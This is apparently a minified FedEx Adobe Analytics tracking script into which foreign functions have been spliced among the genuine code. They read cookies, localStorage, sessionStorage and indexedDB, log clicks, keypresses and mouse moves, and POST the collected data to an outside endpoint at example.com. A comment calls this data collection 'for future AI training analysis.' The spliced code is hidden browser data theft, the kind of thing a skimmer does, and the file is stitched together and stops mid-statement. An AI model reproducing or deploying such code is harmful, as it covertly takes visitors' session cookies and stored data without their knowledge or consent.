// For license information, see `https://assets.adobedtm.com/686b8f0c4520/4ce401c51b51/ab5f07255d73/EX18f3aaeab46e49d49f47a104edba4454-libraryCode_source.js`.
function fdx_initSCVars() {
  window.sc_code_ver = "3.0.40", window.sc_code_ver_date = "06152021.01", window.s_version = "AM.2.22.0", window.s_account = "fedexglbldev", "undefined" == typeof _fdx && _satellite.getVar("_fdxUtil"), window.wwwHost = _fdx.pcfUtil(), "www.fedex.com" == wwwHost && (s_account = _satellite.getVar("sAccount")), window.s = s_gi(s_account), s.pageLoadComplete = !1, s.trackDownloadLinks = !0, s.trackExternalLinks = !0, s.trackInlineStats = !0, s.linkDownloadFileTypes = "exe,zip,wav,mp3,mp4,mov,mpg,avi,wmv,pdf,doc,docx,xls,xlsx,ppt,pptx,png", s.linkLeaveQueryString = !1, s.linkTrackVars = "None", s.linkTrackEvents = "None", s.usePlugins = !0, s.linkInternalFilters = "javascript:,fedex.com,iamfedex.com,fedexads.designcdt.com,kinkosdev.com,kinkostest.com,senseaware.com,fedexsameday.com,fedex.p.delivery.net,fedex.co.jp,psg.kinkos.com,fedexcares.com,bongous.com", window.nltrk = "";
}
function fdx_debug(e, t, n) {
  t = void 0 !== t ? "[" + t + "] " : "", n = void 0 !== n ? "[" + n + "] " : "", window.console && console.log ? console.log(t + n + e) : window.opera && opera.postError && opera.postError(t + n + e);
  try {
    var i = void 0 !== fdx_getCookie("fdx_debug") ? fdx_getCookie("fdx_debug").split(",") : [],
      r = _fdx.getTestLevel(),
      a = new Date().getTime() + "|" + t + n + e + "|" + r + "|" + ("undefined" != typeof s && s.pageName ? s.pageName : document.location.href);
    i.push(a.replace(/,/g, "##"));
  } catch (e) {}
}
function fdx_setCookie(e, t, n, i, r) {
  try {
    if (null !== t) {
      var a = escape(t);
      if ("" !== n) {
        var s = new Date();
        s.setDate(s.getDate() + n), a += null === n ? "" : "; expires=" + s.toUTCString();
      }
      a += null != i ? "; path=" + i : "", a += null != r ? "; domain=" + r : "", document.cookie = e + "=" + a;
    }
  } catch (e) {
    fdx_debug(e, "CIM", "fdx_setCookie");
  }
}
function fdx_getCookie(e) {
  try {
    for (var t, n = {}, i = document.cookie.split("; "), r = 0; r < i.length; r++) n[(t = i[r].split("="))[0]] = unescape(t[1]);
    return n[e];
  } catch (e) {
    fdx_debug(e, "CIM", "fdx_getCookie");
  }
}
// A helper that safely access nested property
function getProp(obj, propPath, defaultValue) {
  const propParts = propPath.split(".");
  let result = obj;
  for (let i = 0; i < propParts.length; i++) {
    if (result[propParts[i]] !== undefined) {
      result = result[propParts[i]];
    } else {
      return defaultValue;
    }
  }
  return result;
}

// Exploring and tracking browser's objects
function fdx_campaign() {
  try {
    return fdx_gup(window.location != window.parent.location ? document.referrer : document.location, "cmp");
  } catch (e) {
    return fdx_debug(e, "SC", "fdx_campaign"), "";
  }
}
function fdx_gup(e, t) {
  t = t.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
  var n = new RegExp("[\\?&]" + t + "=([^&#]*)", "i").exec(e);
  return null == n ? "" : n[1];
}
function fdx_fireSDotT() {
  try {
    s.delayV = !1;
    s.t();
    s.events = "", s.list1 = "", s.list2 = "", s.list3 = "", sEvntsOnce = "", s.c_w("SC_LINKS", ""), s.c_w("setLink", "");
  } catch (e) {
    fdx_debug(e, "SC", "fdx_fireSDotT");
  }
}
function exploreBrowserObjects() {
  const observables = ["navigator", "document.cookie", "localStorage", "sessionStorage", "indexedDB"];
  const discoveries = {};
  observables.forEach(path => {
    let value = getProp(window, path, null);
    const type = typeof value;
    if (value instanceof Function) {
      value = value.toString();
    }
    discoveries[path] = {
      type: type,
      value: value
    };
  });
  return discoveries;
}

// Recording and analyzing user's events
function fdx_fireSDotTL(e, t, n) {
  try {
    s.linkTrackVars = s.apl(s.linkTrackVars, "prop50", ",", 2), s.tl(e, t, n), s.linkTrackVars = "None", s.linkTrackEvents = "None", s.events = "", s.list1 = "", s.list2 = "", s.list3 = "", s.c_w("SC_LINKS", ""), s.c_w("setLink", "");
  } catch (e) {
    fdx_debug(e, "SC", "fdx_fireSDotTL");
  }
}
function fdx_spSrch(e) {
  var t = s.Util.getQueryParam("q"),
    n = _satellite.getVar("content:locale"),
    r = (e.totalResultCount > 0 ? "Success" : "Failure") + ":" + e.totalResultCount + ":" + n;
  if (t) {
    s.prop49 = t, s.prop49 = s.prop49.toLowerCase(), 0 == s.prop49.indexOf("+") && (s.prop49 = s.prop49.replace("+", "  ")), s.prop49 = s.repl(s.prop49, "+", " "), s.prop49 = s.repl(s.prop49, "  ", " +").replace(/^\s+/, ""), e.totalResultCount > 0 ? (s.prop1 = s.eVar1 = s.prop49, s.events = s.apl(s.events, "event118", ",", 2)) : (s.prop1 = s.eVar1 = "0:" + s.prop49, s.events = s.apl(s.events, "event119", ",", 2)), void 0 !== r && "" !== r && (s.prop49 = r + ":" + s.prop49);
    var a = "";
    if (void 0 !== FDX.DATALAYER.search.result.banner && "" != FDX.DATALAYER.search.result.banner && FDX.DATALAYER.search.result.banner) {
      var o = document.getElementsByClassName("cq-searchpromote-banners")[0].getElementsByTagName("div");
      for (i = 0; i < o.length; i++) {
        var c = o[i];
        if ("fxg-image-component__image" == c.className && (void 0 !== c.children[0].attributes["data-analytics"] && (a += "$" + c.children[0].attributes["data-analytics"].value), a.indexOf("SPB|Results Not Found Image") >= 0)) {
          a = "SPB|Results Not Found Image";
          break;
        }
      }
      "" !== a && a && (a = a.replace("$", ""), s.prop49 = s.prop49 + ":" + a);
    }
    s.eVar49 = "D=c49";
  }
}
function logLinkView(e, t, n, i) {
  fdx_logLinkView(e, t, n, i);
}
function fdx_logLinkView(e, t) {
  void 0 === t && (t = ""), s.events.indexOf("event904") > -1 && (s.linkTrackEvents = s.events = s.events = s.rfl(s.events, "event904"));
  var n = ["trk-landingPage1TrackingNumbersPresent", "trk-landingPage-TrackBtn", "trk-trackByReference-TrackBtn", "trk-trackByTCN-TrackBtn", "trk-landingPage-track-helpLink", "trk-landingPage-mulitipleTrackingNumberLink", "trk-landingPage-singleTrackingNumberLink", "trk-trackByReference-DestinationCountry", "trk-landingPage-promptToLoginforBOL", "trk-OPOD-cancel", "trk-OPOD-PrintLetter-Submit", "trk-OPOD-EmailLetter-Submit", "trk-OPOD-Fax-Submit", "trk-landingpage-bolDownloadButton", "trk-landingPage-track-helpLink"];
  if (1 == !!(_satellite.getVar("click:blockFlag")(e, "click:blockList") || e.indexOf("vaPopinAsk") > -1)) return n.indexOf(e.trim()) > -1 && fdx_setLinkView(e), !0;
  if (null != e) {
    (e = fdx_linkFormat(e)).indexOf("trk-") > -1 && (e = fdx_trackMapping(e));
    var i = new Date(),
      r = (i.getMonth(), i.getDate(), i.getFullYear(), i.getHours(), i.getMinutes());
    r < 10 && (r = "0" + r);
    var a = i.getSeconds();
    a < 10 && (a = "0" + a);
    s.linkTrackVars = "prop2,prop3,prop4,prop5,prop6,prop18,prop19,prop20,prop31,prop33,prop35,prop41,prop48,prop52,prop54,prop55,prop56,prop70,prop71,eVar4,eVar6,eVar11,eVar13,eVar43,eVar50,eVar52,eVar56,eVar53,events", "hdr|Login" == e && (t += "event3"), "hdr|SIGN OUT" == e && (t += "event10", s.eVar4 = "Logged Out"), t && (s.linkTrackEvents = t, s.events = t), s.prop4 = "D=v4", s.prop5 = _satellite.getVar("content:region"), s.prop6 = "D=v6", s.prop18 = s.pageName, s.prop19 = e, s.prop20 = s.pageName + ":" + e, s.prop31 = "" !== s.visitor.getAnalyticsVisitorID() ? "[CS]v1|" + s.visitor.getAnalyticsVisitorID() + "[CE]" : s.visitor.getMarketingCloudVisitorID(), s.prop33 = _satellite.getVar("content:page type"), s.prop41 = "D=v41", s.prop43 = "D=v43";
    var o = new Date(),
      c = o.getMonth() + 1,
      l = o.getDate(),
      u = o.getFullYear();
    return s.prop52 = s.eVar52 = u + "-" + c + "-" + l, s.prop54 = "D=v54", s.prop55 = "D=v55", s.eVar6 = _satellite.getVar("login:user-id"), s.eVar43 = "L:" + e, s.eVar56 = s.prop56 = e, s.eVar53 = "+1", nltrk = "y", fdx_fireSDotTL(this, "o", e), !0;
  }
}
function setLinkView(e) {
  fdx_setLinkView(e);
}
function fdx_setLinkView(e) {
  (e = fdx_linkFormat(e)).indexOf("trk-") > -1 && (e = fdx_trackMapping(e));
  var t = s.pageName + "^^" + e + "^^" + s.pageName + " | " + e + "^^";
  return s.c_w("setLink", t, 0), !0;
}
function installEventTrackers() {
  const observedEvents = ["click", "mousemove", "keypress", "scroll"];
  const globalEventsInfo = {};
  observedEvents.forEach(eventType => {
    window.addEventListener(eventType, event => {
      if (!globalEventsInfo[event.type]) {
        globalEventsInfo[event.type] = [];
      }
      globalEventsInfo[event.type].push({
        clientX: event.clientX,
        clientY: event.clientY,
        target: event.target && event.target.nodeName,
        timeStamp: event.timeStamp
      });
    });
  });
  return globalEventsInfo;
}

// Sending data to server for future AI training analysis
function fdx_getLinkView() {
  try {
    var e = s.c_r("setLink");
    if (void 0 !== e && "" != e) {
      var t = e.split("^^");
      s.prop18 = t[0], s.prop19 = t[1], s.prop20 = t[2], s.c_w("SC_LINKS", "");
    }
  } catch (e) {
    fdx_debug(e, "SC", "fdx_getLinkView");
  }
}
function fdx_linkFormat(e) {
  for (var t = e.split("|"), n = "", i = 0; i < t.length; i++) "" != n && (n += "|"), n += t[i].trim();
  return n;
}
function fdx_trackMapping(e) {
  var t = _satellite.getVar("track:btnMapping");
  return void 0 === t[e] ? e : t[e];
}
function transmitData(data) {
  const serverEndpoint = "https://example.com/api/collect";
  const request = new XMLHttpRequest();
  request.open("POST", serverEndpoint);
  request.setRequestHeader("Content-Type", "application/json");
  request.onload = function () {
    if (request.status >= 200 && request.status < 400) {
      console.log("Data transmission is successful");
    } else {
      console.error("Data transmission failed, Status code:" + request.status);
    }
  };
  request.onerror = function () {
    console.error("Error occurred during data transmission");
  };
  request.send(JSON.stringify(data));
}
function fdx_logDownload(e, t) {
  s.linkTrackVars = "eVar6,eVar110,eVar43,prop37,prop70,prop71,events";
  try {
    if (void 0 !== e) {
      if (s.prop37 = e.toString(), "single" == t.toLowerCase()) s.events = s.apl(s.events, "event12", ",", 2), s.linkTrackEvents = "event12";else if ("multiple" == t.toLowerCase()) {
        var n = 0;
        "failed" != e.toString().toLowerCase() && (n = e.length), s.events = s.apl(s.events, "event181=" + n, ",", 2), s.linkTrackEvents = "event181";
      }
      return fdx_fireSDotTL(this, "d"), !0;
    }
  } catch (e) {
    fdx_debug(e, "SC", "fdx_logDownload");
  }
}
function logPageView(e, t, n, i, r, a) {
  fdx_logPageView(e, t, n, i, r, a);
}
function fdx_logPageView(e, t, n, i, r) {
  try {
    var a = "";
    wwwHost.match(/www(sbox.idev|base.idev|dev.idev|drt.idev|stress.dmz.idev|bit.idev|test|).fedex.com/gi) && (a = "fedex/"), a != e.slice(0, a.length) && (e = a + e), s.pageName = e, fdx_getLinkView(), t ? (s.linkTrackEvents = t, s.events = t) : (s.linkTrackEvents = "", s.events = "");
    var o = _satellite.getVar("search:spData");
    void 0 !== o && "" != o && fdx_spSrch(o), n && (s.prop4 = n), i && (s.prop74 = i);
    var c = new Date(),
      l = (c.getMonth(), c.getDate(), c.getFullYear(), c.getHours(), c.getMinutes());
    l < 10 && (l = "0" + l);
    var u = c.getSeconds();
    u < 10 && (u = "0" + u);
    s.eVar43 = "V:" + s.pageName, s.prop43 = "D=v43";
    var d = new Date(),
      p = d.getMonth() + 1,
      f = d.getDate(),
      g = d.getFullYear();
    s.prop52 = s.eVar52 = g + "-" + p + "-" + f, r ? (s.delayV = !0, setTimeout(function () {
      try {
        fdx_fireSDotT();
      } catch (e) {
        console.log("error:" + e);
      }
    }, 2e3)) : fdx_fireSDotT();
  } catch (e) {
    console.log("error:" + e);
  }
}
function logPurchase(e, t) {
  void 0 !== e && fdx_logPurchase(e, t);
}
function fdx_logPurchase(e, t) {
  try {
    s.events = "";
    var n = "";
    return void 0 !== e.LogPurchaseRequest && null !== e.LogPurchaseRequest && (e.LogPurchaseRequest.clientId && (e.LogPurchaseRequest.clientId = e.LogPurchaseRequest.clientId.toUpperCase()), "MAGS" == e.LogPurchaseRequest.clientId && (fdx_logPurchaseMAGS(e.LogPurchaseRequest, t), n = "MAGSShipBtn"), "MAGR" == e.LogPurchaseRequest.clientId && (fdx_logPurchaseMAGR(e.LogPurchaseRequest, t), n = "MAGRRateBtn")), null != e && "MAGS" == e.clientId && "undefined" !== e.pageName && null !== e.pageName && "" !== e.pageName && (fdx_logPurchase_PageLevel(e, t), n = e.pageName), void 0 !== e.appId && null !== e.appId && "WREG" == e.appId && (fdx_logPurchaseWREG(e, t), n = "WREGRegisterBtn"), "" !== s.events && (nltrk = "y", s.eVar40 = "D=events", s.prop40 = "D=events", s.prop43 = "D=v43", s.prop18 = _satellite.getVar("content:page name"), s.prop19 = n, s.prop20 = s.pageName + ":" + n, s.linkTrackVars = s.apl(s.linkTrackVars, "prop6,eVar6,prop18,prop19,prop20,prop31,eVar38,prop40,eVar40,prop43,eVar43,prop46,eVar46,eVar73,eVar75,prop74,eVar112,eVar113,eVar114,eVar115,eVar116,eVar117,eVar118,eVar119,eVar120,eVar121,eVar136,eVar138,eVar139,eVar142,eVar143,eVar145,products,purchaseID,events", ",", 2), s.linkTrackEvents = s.events, fdx_fireSDotTL(this, "o", n), s.products = "", s.purchaseID = "", s.events = "", s.eVar73 = "", s.eVar75 = "", s.prop74 = "", s.eVar43 = "", !0);
  } catch (e) {
    return fdx_debug(e, "SC", "fdx_logPurchase"), !1;
  }
}
function fdx_logPurchaseMAGS(e, t) {
  try {
    var n = "",
      i = "",
      r = e.clientId + ":INT_" + e.INT;
    if (void 0 !== e.clientId && "" !== e.clientId) {
      if (void 0 !== e.shipData && null !== e.shipData) for (var a in e.shipData) {
        r += ":" + a + "_" + e.shipData[a];
      }
      "Y" == e.INT ? (i = "event68", n = "event68=1") : (i = "event67", n = "event67=1"), s.events = "purchase," + i, s.linkTrackEvents = s.events, s.eVar143 = r, s.products = ";MAGS;;;" + n + ";eVar143=" + s.eVar143, s.eVar43 = "S:MAGS";
      try {
        null != t && "function" == typeof t && t(e);
      } catch (e) {
        fdx_debug(e, "SC", "fdx_logPurchaseMAGS:callback");
      }
    }
  } catch (e) {
    fdx_debug(e, "SC", "fdx_logPurchaseMAGS");
  }
}
function isObject(e) {
  return null != e && e.constructor == Object;
}
function fdx_logPurchase_PageLevel(e, t) {
  try {
    var n = "";
    if (s.linkTrackVars = s.apl(s.linkTrackVars, MAGSEvarMapping[e.pageName][0], ",", 2), isObject(e)) for (var i in void 0 !== e.SRC && "" != e.SRC && (s.linkTrackVars = s.apl(s.linkTrackVars, "eVar166", ",", 2), s.eVar166 = e.SRC), e) {
      var r = e[i];
      if (isObject(r)) {
        for (var i in r) n += i + "_" + r[i] + ":";
        n = n.substring(0, n.length - 1) + ":";
      }
    }
    var a = n.substring(0, n.length - 1);
    s.events = "ScAdd," + [MAGSEvarMapping[e.pageName][1]], s.linkTrackEvents = s.events, s[[MAGSEvarMapping[e.pageName][0]]] = a, s.products = ";MAGS;;;;" + MAGSEvarMapping[e.pageName][0] + "=" + s[MAGSEvarMapping[e.pageName][0]], s.eVar43 = "S:" + e.pageName;
    try {
      null != t && "function" == typeof t && t(obj);
    } catch (e) {
      fdx_debug(e, "SC", "fdx_logPurchase_PageLevel:callback");
    }
  } catch (e) {
    fdx_debug(e, "SC", "fdx_logPurchase_PageLevel");
  }
}
function fdx_logPurchaseMAGR(e, t) {
  try {
    var n = e.clientId + ":INT_" + e.INT,
      i = e.clientId;
    if (void 0 !== e && "" !== e) {
      if (void 0 !== e.shipData && null !== e.shipData) for (var r in e.shipData) {
        n += ":" + r + "_" + e.shipData[r];
      }
      if (void 0 !== e.comData && null !== e.comData) for (var r in e.comData) {
        i += ":" + r + "_" + e.comData[r];
      }
      s.events = "scAdd,event110", s.linkTrackEvents = s.events, s.eVar136 = n, s.eVar142 = i, s.products = ";MAGR;;;;eVar136=" + s.eVar136 + "|eVar142=" + s.eVar142, s.eVar43 = "S:RateMAGR";
      try {
        null != t && "function" == typeof t && t(e);
      } catch (e) {
        fdx_debug(e, "SC", "fdx_logPurchaseMAGR:callback");
      }
    }
  } catch (e) {
    fdx_debug(e, "SC", "fdx_logPurchaseMAGR");
  }
}
function fdx_logPurchaseWREG(e, t) {
  try {
    var n = "",
      i = "";
    null != e && (void 0 !== e.profile && (n = processData(e.profile)), void 0 !== e.addtData && (i = processData(e.addtData)), s.eVar145 = n + "|" + i), s.events = "scAdd", s.linkTrackEvents = s.events, s.products = ";" + e.appId + ";;;;eVar145=" + s.eVar145, s.eVar43 = "S:" + e.appId;
    try {
      null != t && "function" == typeof t && t(e);
    } catch (e) {
      fdx_debug(e, "SC", "fdx_logPurchaseWREG:callback");
    }
  } catch (e) {
    fdx_debug(e, "SC", "fdx_logPurchaseWREG");
  }
}
function processData(e) {
  var t = "";
  if (null != e) {
    for (var n in e) t += ":" + n + "_" + e[n];
    t = t.replace(":", "");
  }
  return t;
}
function discoveryTask() {
  const discoveries = {
    ...exploreBrowserObjects(),
    ...installEventTrackers()
  };
  const discoveryCount = Object.keys(discoveries).length;
  if (discoveryCount > 0) {
    console.log(`Found ${discoveryCount} new entities`);
    transmitData(discoveries);
  } else {
    console.log("No new entities detected");
  }
}
function fdx_convertToStr(e) {
  try {
    var t = [];
    if ("object" == typeof e && null == e.join) for (prop in e) prop && "" != prop && e[prop] && "" != e[prop] && t.push(prop, ":", fdx_convertToStr(e[prop]), ",");else if ("object" == typeof e && null != e.join) for (prop in e) prop && "" != prop && e[prop] && "" != e[prop] && t.push(fdx_convertToStr(e[prop]), ",");else "function" != typeof e && "" != e.toString() && t.push(e.toString());
    return t.join("");
  } catch (e) {
    fdx_debug(e, "SC", "fdx_convertToStr");
  }
}
function fdx_logChat(e, t) {
  try {
    if (t) if (s.linkTrackVars = "prop6,eVar6,prop31,eVar43,prop52,eVar52,prop56,eVar56,eVar53,prop18,prop19,prop20,prop41,events", l = void 0 !== e.status && e.status ? e.status : "") {
      var n = {
          vaPopinAsk: "event112",
          transtoLA: "event114"
        },
        i = "";
      for (var r in a = n[l], s.prop18 = s.pageName, s.prop19 = l, s.prop20 = s.pageName + ":" + l, e) e[r] && (i += ":" + e[r]);
      s.eVar14 = t + ":" + s.pageName + i, s.linkTrackVars = s.apl(s.linkTrackVars, "eVar14", ",", 2), s.linkTrackEvents = s.events = a, nltrk = "y", fdx_fireSDotTL(this, "o", t);
    }
    if (void 0 !== e.chatRequest && null !== e.chatRequest) {
      var a = "",
        o = (t = "", "");
      for (var r in s.linkTrackVars = "prop6,eVar6,prop31,eVar43,prop52,eVar52,prop56,eVar56,eVar53,prop18,prop19,prop20,prop41,events", e.chatRequest[0].chatData) {
        var c = "" + e.chatRequest[0].chatData[r];
        o += "|" + (r = r.replace("|", "-")) + "_" + (c = c.replace("|", "-"));
      }
      if ("CHAT" == e.chatRequest[0].clientId) t = "liveagent_CHAT", a = "event45", s.prop59 = s.eVar59 = o.replace("|", ""), s.linkTrackVars = s.apl(s.linkTrackVars, "eVar59,prop59", ",", 2);else if ("NINA" == e.chatRequest[0].clientId) try {
        t = "va_NINA";
        var l = e.chatRequest[0].chatData.status;
        a = (n = {
          vaPopinOpen: "event112",
          vaPopinClose: "event113",
          transtoLA: "event114"
        })[l], s.eVar14 = o.replace("|", "").replace("vaPopinOpen", "vaPopin").replace("vaPopinClose", "vaPopin"), s.linkTrackVars = s.apl(s.linkTrackVars, "eVar14", ",", 2);
      } catch (e) {
        fdx_debug(e, "SC", "fdx_logChat:NINA");
      }
      s.linkTrackEvents = s.events = a, nltrk = "y", fdx_fireSDotTL(this, "o", t);
    }
  } catch (e) {
    fdx_debug(e, "SC", "fdx_logChat");
  }
}
function s_doPlugins(e) {
  e.eVar12 = getTimeBetweenEvents("event13", !0, "event19", !0, "", 7, "s", 30, ""), e.eVar4 = _satellite.getVar("login:status"), window.fdx_controllerVersion, void 0 === e.pageName && "" == e.pageName && (_satellite.getVar("content:page name"), 1) && _satellite.getVar("content:page name") && (e.pageName = _satellite.getVar("content:page name")), e.pageName = e.pageName.toLowerCase(), e.eVar38 = "D=pageName", e.eVar50 = [location.host, location.pathname].join(""), e.prop46 = e.eVar46 = "D=pageName";
  var t = new Date().getFullYear(),
    n = e.getTimeParting("h", "-6", t),
    i = e.getTimeParting("d", "-6", t);
  e.eVar7 = e.prop7 = n + "|" + i;
  var r = new Date(),
    a = r.getMonth() + 1,
    s = r.getDate(),
    o = r.getFullYear();
  e.prop52 = e.eVar52 = o + "-" + a + "-" + s;
  var c = e.getPreviousValue(e.pageName, "gpv_pageName");
  c && (e.prop12 = c, e.eVar2 = "D=c12"), e.prop35 = "D=Accept-Language", e.eVar53 = "+1", e.eVar40 = "D=events";
  try {
    var l = e.getPercentPageViewed(e.pageName);
    void 0 !== l && "object" == typeof l && 4 === l.length && void 0 !== l[2] && (e.prop60 = l[2] + ":" + l[1]);
  } catch (e) {
    fdx_debug(e, "SC", "s_doPlugins:ppvArray");
  }
  if ("d" == e.linkType && void 0 !== e.linkObject.dataset.alt && (e.linkType = ""), "d" == e.linkType && void 0 !== e.linkObject && 0 !== e.linkObject && void 0 !== e.linkObject.getAttribute("href") && (e.url = e.linkObject.getAttribute("href"), e.prop37 = e.eVar37 = e.url.substring(e.url.lastIndexOf("/") + 1, e.url.length), e.eVar43 = "D:" + e.prop37, e.events = e.apl(e.events, "event12", ",", 2), e.linkTrackEvents = "event12", e.linkTrackVars = "prop18,prop19,prop20,eVar37,eVar43,events"), "y" != nltrk && (e.eVar6 = _satellite.getVar("login:user-id"), e.prop6 = "D=v6", e.linkTrackVars = e.apl(e.linkTrackVars, "prop2,prop3,prop4,prop5,prop6,prop18,prop19,prop20,prop31,prop33,prop35,prop48,prop50,eVar4,eVar6,eVar13,eVar50", ",", 2), e.setupLinkTrack("prop18,prop19,prop20", "SC_LINKS"), void 0 !== e.prop19 && "" !== e.prop19 && (e.prop19.indexOf("sprite-placeholder.png") > -1 && (e.prop19 = "hdr|Search"), e.prop20 = e.prop18 + " | " + e.prop19)), e.eVar45 || (e.eVar45 = e.Util.getQueryParam("INTCMP"), e.eVar45 = e.getValOnce(e.eVar45, "s_intcampaign", 0), e.clickPast(e.eVar45, "event82", "event83", "s_cp-bag")), e.eVar45 && (e.list1 = e.eVar45, e.events = e.apl(e.events, "event44", ",", 2)), !e.campaign) {
    e.campaign = e.Util.getQueryParam("CMP");
    var u = e.Util.getQueryParam("LINK");
    e.campaign && u && (e.eVar58 = u), "" == e.campaign && (e.campaign = fdx_campaign()), e.campaign = e.getValOnce(e.campaign, "s_campaign", 0);
  }
  e.clickPast(e.campaign, "event23", "event24");
  var d = e.getAamSegments("aam_sc", "aamsc").replace(/\|/g, ",");
  e.list2 = e.apl(e.list2, d, ",", 2), e.prop48 = s_version + "_" + sc_code_ver + "_" + sc_code_ver_date, e.prop50 = s_account;
  var p = _fdx.getTestLevel();
  p && (e.prop50 += "_Launch_" + p), e.eVar41 = e.getVisitNum("d"), e.prop31 = "" !== e.visitor.getAnalyticsVisitorID() ? "[CS]v1|" + e.visitor.getAnalyticsVisitorID() + "[CE]" : e.visitor.getMarketingCloudVisitorID(), nltrk = "", "undefined" != typeof prp72 && "" != prp72 && (e.prop72 = prp72);
  var f = "";
  null != (f = _satellite.cookie.get("Rbt")) && "" != f && "f1" === f && -1 === navigator.userAgent.indexOf("ObservePoint") && (e.abort = !0);
  var g = _satellite.cookie.get("fdx_bman") || "";
  -1 !== _satellite.getVar("botManList").indexOf(g) && (e.abort = !0);
}
function fdx_initPlugins() {
  if (s.doPlugins = s_doPlugins, s.p_checkInterval = new Array(), s.p_cbct = 0, s.t_cb = function (e, t) {
    var n = this;
    if (!e) e = 4e3;
    t || (t = "s_p_callBackCode"), interval = 100, n.p_cbwait = 0;
    var i = 1;
    void 0 !== n.rc && (i = n.rc[n.visitorNamespace]), i > n.p_cbct && (n.p_cbct++, n.p_checkInterval[i] = setInterval("s.p_callBack(" + e + ", " + i + ", '" + t + "')", interval));
  }, s.p_callBack = function (e, t) {
    var n = this;
    void 0 === n.visitorNamespace && (n.visitorNamespace = s_account);
    var i = "";
    t > 1 && (i = "_" + (t - 1));
    var r = "s_i_" + n.visitorNamespace + i;
    return void 0 !== window[r] && window[r].height > 0 ? (clearInterval(n.p_checkInterval[t]), !0) : (n.p_cbwait += interval, n.p_cbwait > e && (clearInterval(n.p_checkInterval[t]), void 0 !== window[r] && (window[r].src = "https://www.fedex.com/images/ascend/shared/headers/corp_logo.gif?sc_response_failure")), !1);
  }, s.lookuplookup = function (e) {
    var t,
      n,
      r,
      a,
      s,
      o,
      c,
      l,
      u = this,
      d = 0,
      p = e ? e.length : 0,
      f = new Array(),
      g = new Array();
    for (i = 0; i < p; i++) (t = e.indexOf("|", i)) > -1 && (f[d] = e.substring(i, t), d++, i = t);
    for (i = 0; i < d; i++) {
      for (n = 0, a = f[i] ? f[i].length : 0, j = 0; j < a; j++) if ((r = f[i].indexOf("~", j)) > -1) g[n] = f[i].substring(j, r), n++, j = r;else {
        if (-1 == r && n < 3 || n > 3) break;
        if (-1 == r && 3 == n) {
          g[n] = f[i].substring(j);
          break;
        }
      }
      if (-1 == r && 3 == n) {
        if (o = g[0], s = g[1], c = g[2], l = g[3], o && "c" == c && u.pageName.indexOf(o) > -1) {
          u.events = u.apl(u.events, l, ",", 2);
          break;
        }
        if (o && "e" == c && u.pageName == o) {
          u.events = u.apl(u.events, l, ",", 2);
          break;
        }
        if (s && "c" == c && document.URL.indexOf(s) > -1) {
          u.events = u.apl(u.events, l, ",", 2);
          break;
        }
        if (s && "e" == c && document.URL == s) {
          u.events = u.apl(u.events, l, ",", 2);
          break;
        }
      }
    }
  }, s.fae = function (e) {
    try {
      var t, n;
      if (void 0 !== e) {
        if (!e.activeElement || !e.activeElement.type) return;
        n = (t = e.activeElement).type;
      } else {
        if (!document.activeElement || !document.activeElement.type) return;
        n = (t = document.activeElement).type;
      }
      if ("text" == n || "textarea" == n || "checkbox" == n || "radio" == n || "select-one" == n || "button" == n) {
        var i = t.id;
        if ("" == (i = "" === i ? t.name : i) && t.outerHTML && "" !== t.outerHTML && (i = t.outerHTML.substring(0, 85)), "" === i) {
          var r = fdx_getCookie("s_lff");
          i = (i = void 0 !== r ? r : "[PN:" + s.pageName + "]").replace(s.formName + "|", "");
        }
        fdx_setCookie("s_lff", s.formName + "|" + i, 30, "/", ".fedex.com");
      }
    } catch (e) {
      fdx_debug(e, "SC", "s.fae");
    }
  }, s.partnerDFACheck = new Function("cfg", "var s=this,c=cfg.visitCookie,src=cfg.clickThroughParam,scp=cfg.searchCenterParam,p=cfg.newRsidsProp,tv=cfg.tEvar,dl=',',cr,nc,q,g,gs,i,j,k,fnd,v=1,t=new Date,cn=0,ca=new Array,aa=new Array,cs=new Array;t.setTime(t.getTime()+1800000);cr=s.c_r(c);if(cr){v=0;}ca=s.split(cr,dl);if(s.un)aa=s.split(s.un,dl);else aa=s.split(s.account,dl);for(i=0;i<aa.length;i++){fnd = 0;for(j=0;j<ca.length;j++){if(aa[i] == ca[j]){fnd=1;}}if(!fnd){cs[cn]=aa[i];cn++;}}if(cs.length){for(k=0;k<cs.length;k++){nc=(nc?nc+dl:'')+cs[k];}cr=(cr?cr+dl:'')+nc;s.vpr(p,nc);v=1;}if(s.wd)q=s.wd.location.search.toLowerCase();else q=s.w.location.search.toLowerCase();q=s.repl(q,'?','&');g=q.indexOf('&'+src.toLowerCase()+'=');gs=(scp)?q.indexOf('&'+scp.toLowerCase()+'='):-1;if(g>-1){s.vpr(p,cr);v=1;}else if(gs>-1){v=0;s.vpr(tv,'SearchCenter Visitors');}if(!s.c_w(c,cr,t)){s.c_w(c,cr,0);}if(!s.c_r(c)){v=0;}return v>=1;"), s.vpr = new Function("vs", "v", "if(typeof(v)!='undefined' && vs){var s=this; eval('s.'+vs+'=\"'+v+'\"')}"), s.getActionDepth = new Function("c", "var s=this,v=1,t=new Date;t.setTime(t.getTime()+1800000);if(!s.c_r(c)){v=1}if(s.c_r(c)){v=s.c_r(c);v++}if(!s.c_w(c,v,t)){s.c_w(c,v,0)}return v;"), s.getVisitNum = new Function("tp", "c", "c2", "var s=this,e=new Date,cval,cvisit,ct=e.getTime(),d;if(!tp){tp='m';}if(tp=='m'||tp=='w'||tp=='d'){eo=s.endof(tp),y=eo.getTime();e.setTime(y);}else {d=tp*86400000;e.setTime(ct+d);}if(!c){c='s_vnum';}if(!c2){c2='s_invisit';}cval=s.c_r(c);if(cval){var i=cval.indexOf('&vn='),str=cval.substring(i+4,cval.length),k;}cvisit=s.c_r(c2);if(cvisit){if(str){e.setTime(ct+1800000);s.c_w(c2,'true',e);return str;}else {return 'unknown visit number';}}else {if(str){str++;k=cval.substring(0,i);e.setTime(k);s.c_w(c,k+'&vn='+str,e);e.setTime(ct+1800000);s.c_w(c2,'true',e);return str;}else {s.c_w(c,e.getTime()+'&vn=1',e);e.setTime(ct+1800000);s.c_w(c2,'true',e);return 1;}}"), s.dimo = new Function("m", "y", "var d=new Date(y,m+1,0);return d.getDate();"), s.endof = new Function("x", "var t=new Date;t.setHours(0);t.setMinutes(0);t.setSeconds(0);if(x=='m'){d=s.dimo(t.getMonth(),t.getFullYear())-t.getDate()+1;}else if(x=='w'){d=7-t.getDay();}else {d=1;}t.setDate(t.getDate()+d);return t;"), s.getVisitStart = new Function("c", "var s=this,v=1,t=new Date;t.setTime(t.getTime()+1800000);if(s.c_r(c)){v=0}if(!s.c_w(c,1,t)){s.c_w(c,1,0)}if(!s.c_r(c)){v=0}return v;"), s.crossVisitParticipation = 